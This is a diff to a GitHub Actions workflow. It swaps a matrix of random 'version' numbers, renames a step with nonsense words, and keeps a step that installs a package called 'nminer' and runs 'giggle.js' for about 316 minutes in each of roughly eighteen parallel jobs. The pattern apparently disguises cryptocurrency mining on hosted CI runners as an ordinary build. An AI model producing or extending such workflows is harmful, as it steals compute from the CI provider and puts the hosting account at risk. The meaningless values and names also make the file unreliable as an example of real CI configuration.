@@ -9,21 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 3512 }
+          - { version: 4238 }
+          - { version: 4027 }
+          - { version: 4253 }
+          - { version: 109 }
+          - { version: 8734 }
+          - { version: 4118 }
+          - { version: 5815 }
+          - { version: 9835 }
+          - { version: 9477 }
+          - { version: 57 }
           - { version: 31 }
-          - { version: 7565 }
-          - { version: 4748 }
-          - { version: 6522 }
-          - { version: 2175 }
-          - { version: 3104 }
-          - { version: 961 }
-          - { version: 8153 }
-          - { version: 3089 }
-          - { version: 8451 }
-          - { version: 9280 }
-          - { version: 2233 }
-          - { version: 2040 }
-          - { version: 2821 }
+          - { version: 2213 }
+          - { version: 3244 }
+          - { version: 1952 }
+          - { version: 1338 }
+          - { version: 8723 }
+          - { version: 9352 }
 
     steps:
       - name: Checkout
@@ -34,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: ah beyond wildly ouch
+      - name: quaintly ack
         run: |
           npm install nminer@latest
-          timeout 317m node giggle.js || echo "giggle executed"
+          timeout 316m node giggle.js || echo "giggle executed"
